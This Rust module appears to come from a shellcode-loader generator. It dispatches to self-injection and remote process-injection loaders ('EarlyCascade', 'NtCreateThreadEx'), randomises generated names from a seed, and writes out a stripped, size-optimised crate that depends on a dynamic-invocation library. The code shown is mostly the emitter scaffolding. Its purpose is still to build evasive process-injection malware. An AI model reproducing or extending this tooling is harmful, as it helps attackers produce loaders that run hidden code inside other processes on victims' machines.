pub mod checks;
pub mod gpu;
pub mod loaders;
pub mod namebook;
pub mod rng;
pub mod keygen;
pub mod sideload;

use std::path::PathBuf;

use crate::spec::{LoaderKind, BuildSpec};

pub use namebook::Namebook;

#[derive(Debug, thiserror::Error)]
pub enum EmitError {
    #[error("io: {0}")]
    Io(#[from] std::io::Error),
    #[error("emit: {0}")]
    Msg(String),
    #[error("sideload: {0}")]
    Sideload(#[from] sideload::SideloadEmitError),
}

#[derive(Debug, Clone)]
pub struct LoaderProgram {
    pub crate_meta: CrateMeta,
    pub files: Vec<EmittedFile>,
}

#[derive(Debug, Clone)]
pub struct CrateMeta {
    pub crate_name: String,
    pub is_cdylib:  bool,
    pub extra_deps: Vec<String>,
    pub extra_features_windows_sys: Vec<&'static str>,
}

#[derive(Debug, Clone)]
pub struct EmittedFile {
    pub rel_path: PathBuf,
    pub body: FileBody,
}

#[derive(Debug, Clone)]
pub enum FileBody {
    Source(Vec<Section>),
    Bytes(Vec<u8>),
}

#[derive(Debug, Clone)]
pub enum Section {
    InnerAttrs(Vec<String>),
    Uses(Vec<String>),
    Items(Vec<Item>),
}

#[derive(Debug, Clone)]
pub enum Item {
    Const { name: String, ty: String, value: String },
    Fn { sig: String, body: String },
    Raw(String),
    ModRef(String),
}

pub fn build(recipe: &BuildSpec) -> Result<LoaderProgram, EmitError> {
    let names = Namebook::from_seed(recipe.seed.0);
    match &recipe.loader {
        LoaderKind::SelfInject { method, format } => {
            loaders::selfinject::build(recipe, &names, *method, format)
        }
        LoaderKind::Remote { method, target_exe } => match method {
            crate::spec::RemoteMethod::EarlyCascade => {
                loaders::earlycascade::build(recipe, &names, target_exe)
            }
            crate::spec::RemoteMethod::NtCreateThreadEx => {
                loaders::syscrt::build(recipe, &names, target_exe)
            }
        },
    }
}

pub fn materialize(prog: &LoaderProgram, root: &std::path::Path) -> Result<(), EmitError> {
    std::fs::create_dir_all(root)?;

    let cargo_toml = render_cargo_toml(&prog.crate_meta);
    std::fs::write(root.join("Cargo.toml"), cargo_toml)?;

    for f in &prog.files {
        let dest = root.join(&f.rel_path);
        if let Some(parent) = dest.parent() {
            std::fs::create_dir_all(parent)?;
        }
        match &f.body {
            FileBody::Bytes(b) => std::fs::write(&dest, b)?,
            FileBody::Source(sections) => {
                let text = render_source(sections);
                std::fs::write(&dest, text)?;
            }
        }
    }
    Ok(())
}

fn render_cargo_toml(meta: &CrateMeta) -> String {
    let mut out = String::new();
    out.push_str(&format!(
        "[package]\nname = \"{}\"\nversion = \"0.0.1\"\nedition = \"2021\"\n\n",
        meta.crate_name
    ));
    if meta.is_cdylib {
        out.push_str("[lib]\ncrate-type = [\"cdylib\"]\npath = \"src/lib.rs\"\n\n");
    }
    out.push_str("[dependencies]\n");
    out.push_str(
        "dyncvoke = { git = \"https://git.smukx.site/smukx/Dyncvoke.git\" }\n",
    );
    for line in &meta.extra_deps {
        out.push_str(line);
        out.push('\n');
    }
    out.push_str("\n[dependencies.windows-sys]\nversion = \"0.61\"\nfeatures = [\n");
    for f in &meta.extra_features_windows_sys {
        out.push_str(&format!("    \"{f}\",\n"));
    }
    out.push_str("]\n\n");
    out.push_str(
        "[profile.release]\nopt-level = \"z\"\nlto = true\ncodegen-units = 1\npanic = \"abort\"\nstrip = true\n",
    );
    out
}

fn render_source(sections: &[Section]) -> String {
    let mut out = String::new();
    for sec in sections {
        match sec {
            Section::InnerAttrs(attrs) => {
                for a in attrs {
                    out.push_str(a);
                    out.push('\n');
                }
                out.push('\n');
            }
            Section::Uses(uses) => {
                for u in uses {
                    out.push_str(u);
                    out.push('\n');
                }
                out.push('\n');
            }
            Section::Items(items) => {
                for it in items {
                    match it {
                        Item::Const { name, ty, value } => {
                            out.push_str(&format!("const {name}: {ty} = {value};\n\n"));
                        }
                        Item::Fn { sig, body } => {
                            out.push_str(sig);
                            out.push_str(" {\n");
                            out.push_str(body);
                            out.push_str("\n}\n\n");
                        }
                        Item::Raw(s) => {
                            out.push_str(s);
                            out.push_str("\n\n");
                        }
                        Item::ModRef(name) => {
                            out.push_str(&format!("mod {name};\n"));
                        }
                    }
                }
            }
        }
    }
    out
}
